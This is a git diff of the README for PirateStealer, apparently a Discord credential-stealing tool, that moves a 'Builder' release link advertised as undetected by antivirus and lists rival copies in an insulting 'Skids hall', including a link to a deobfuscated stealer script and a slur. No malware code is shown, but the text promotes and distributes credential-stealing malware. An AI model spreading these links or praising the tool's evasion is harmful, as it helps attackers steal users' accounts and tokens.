@@ -9,6 +9,8 @@
 - [Key Features](https://github.com/bytixo/PirateStealer#features)
 - [Configuration](https://github.com/bytixo/PirateStealer#configuration)
 
+## Click here [Builder](https://github.com/bytixo/PirateStealer/releases/latest) (Undected as of now)
+
 ## Skids hall 
 (changing embed colour and removing PirateStealer mention doesnt make your grabber selfcoded dumbass)
 - [PrimeFA](https://cdn.discordapp.com/attachments/902316110198767626/902427254674563092/partial.js) Thx Hideaki for deobfuscation. Spastic owner thinking that making an api gives him the rights to [sell](https://ibb.co/MfnzJC9) PirateStealer
@@ -19,7 +21,7 @@
 - KingFA
 - and others lol
 # PirateStealer 
-# Click here [Builder](https://github.com/bytixo/PirateStealer/releases/tag/1.5.3) (Undected as of now)
+
 
 ## Read this please
 I'm not the original owner of this repository
